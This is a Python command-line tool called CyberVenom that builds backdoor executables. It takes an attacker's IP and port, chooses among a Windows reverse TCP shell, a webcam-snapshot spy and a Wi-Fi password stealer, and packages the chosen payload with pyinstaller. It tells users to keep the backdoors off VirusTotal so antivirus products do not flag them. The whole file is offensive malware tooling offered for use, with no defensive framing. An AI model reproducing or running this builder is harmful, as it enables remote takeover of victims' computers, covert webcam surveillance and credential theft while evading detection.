try:
    import optparse
    from colorama import Fore, Back, Style, init
    import subprocess
    import time
    import base64
    import os
    from Scripts.Payloads.CyberVenom import webcam_spy, winrevtcp, passwrd
    init()
    red = Fore.RED
    reset = Fore.RESET
    parser = optparse.OptionParser()
    parser.add_option("-p", "--payload", dest="payload",
                      help="Define the payload. Type --current payloads to get a list")
    parser.add_option("--LHOST", dest="lhost", help="The attacker's Ip. Your ip")
    parser.add_option("--LPORT", dest="lport", help="The listener port. specify any port")
    parser.add_option("-f", "--filename", dest="file", help="The backdoor file you want to be created")
    parser.add_option("--current ", dest="list", help="List out the current things. --current payloads for payloads")
    options, args = parser.parse_args()
    if options.list == "payloads":
        print("windows/CyberShell/rev_tcp       -      " + red + "strong" + reset)
        print("malware/wifi/password            -      " + Fore.GREEN + "good" + reset)
        print("spy/webcam/snap                  -      " + Fore.GREEN + "good" + reset)
    else:
        print(red)
        print(r"""\
                                                  ----.                                                 
                                                  ::::.                                                 
                               ``                 `````         ``  `                                   
                             `--:--`       .::--.`----. `--:-.-:::..----      .----`  `--::---------.   
                              `::::-`     `::::-` ::::. `::::-----`.:::-`     .::::` .::::..........`   
                               .::::-`   `::::-` `::::. `::::.     .:::-`     .::::` -:::-`             
                                .::::.  `-:::-`  `::::. `::::.     .:::-`     .::::` `-:::--------..`   
    `-:/://::-```.-::::.`:/:`   `-::::``-::::`    ::::. `::::.     -:::-`     .::::`  `.--------::::-`  
    `:o+/:--:/+syyyyyyyy+:ys`    `-:::--::::`     ::::. `::::.     -:::-`     .::::`            `-:::-  
       `:oyyyyyyyyyyyyyyyyys`     `-:::::::.      ::::. `::::.     .:::::------::::` `.````````.-::::`  
     `` ```-/osyyyyyyyyyyyys`      `-:::::.       ::::. `-:::.      `.-::::::::::::` .::::::::::::--`   
    `/so/-`` ``.:+syyyyyyyys`         ```         ````   ```             ``````````   ```````````       
     /yyyyyo+:.````+yyyyyyys`      `  ``                           ```                          `````   
     /yyyyyyyyys.`oyyyyyyyys`     `/ssss.                          :ssss.                      `osss+`  
     /yyyyyyyyo.-syyyyyyyyys`      /yyyy.                          :yyyy.                      `syyyo   
     /yyyyyyy+`/yyyyyyyyyyyo`    ``/yyyy.```       `````````     ``:yyyy.`````````````````     `syyyo   
     /yyyyyy:.+yyyyyyys+/:.`    .ssyyyyyssss:` `:/osyyyyyso+:`` .ssyyyyyssss/.ssssssssssss+:`` `syyyo   
     /yyyyo..syso/:-.````-::`   .oosyyyyoooo-`/syyyyo+++oyyyys/`.oosyyyyoooo:.osssoosossyyyys.``syyyo   
     -///:``-.`     `.-:///:`     `/yyyy.   `oyyyy+.    `.+yyyy+`  :yyyy.     `     ````.syyy+``syyyo   
                                   /yyyy.   -yyyys`       `syyyy.  :yyyy.    `.://///+/++syyyo``syyyo   
                                   /yyyy.   -yyyyo`       `oyyyy-  :yyyy.  ``+yyyyyssssssyyyyo``syyyo   
                                  `/yyyy-`  `syyyy/``    `-yyyys.  :yyyy-```-yyyyo```````oyyyo``syyyo   
                                   -yyyyso++-.oyyyys/:--:oyyyys-`  -yyyyyo++/syyyyo++++++syyyo``syyyo   
                                   `-oyyyyyy:``-+syyyyyyyyys+:`    `-osyyyyy/.+syyyyyyyyyyyyyo``syyyo`  
                                     ``.....`    ``.-----.``         ```.`..`  ```.````````..`  ``..`  



                   """)
        agreement = input("You must never upload these backdoors to virus total.com. If you do you won't be able to use"
                          " these backdoors again because virus total shares the information reguarding these backdoors "
                          "with antivirus softwares. do you proceed Y or N >  ")
        print(reset)
        if agreement == "Y" or agreement == "y":
            code = "pyinstaller --onefile "
            if options.payload == "windows/CyberShell/rev_tcp":
                hidden_imports = winrevtcp.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
                hidden_imports = hidden_imports.split(",")
                for hidden_import in hidden_imports:
                    code += "--hidden-import {} ".format(hidden_import)
                code += options.file
                subprocess.call(code, shell=True)
                print("[+] Finished writing the file")
            elif options.payload == "spy/webcam/snap":
                hidden_imports = webcam_spy.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
                hidden_imports = hidden_imports.split(",")
                for hidden_import in hidden_imports:
                    code += "--hidden-import {} ".format(hidden_import)
                code += options.file
                subprocess.call(code, shell=True)
                print("[+] Finished writing the file")
            elif options.payload == "malware/wifi/password":
                hidden_imports = passwrd.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
                hidden_imports = hidden_imports.split(",")
                for hidden_import in hidden_imports:
                    code += "--hidden-import {} ".format(hidden_import)
                code += options.file
                subprocess.call(code, shell=True)
                print("[+] Finished writing the file")
            else:
                print("[+] No such payload available")
        else:
            print("[+] Wrong parameter for CyberVenom. type python CyberVenom.py -h for more info")
except FileExistsError:
    print("[+] The file name you specified already exists")
    quit()
except KeyboardInterrupt:
    print(red + "KeyBoardInterrupt" + reset)
    quit()
except NameError:
    print("[+] Fill out all the necessary parameters. Type python CyberVenom.py -h for more info")
    quit()
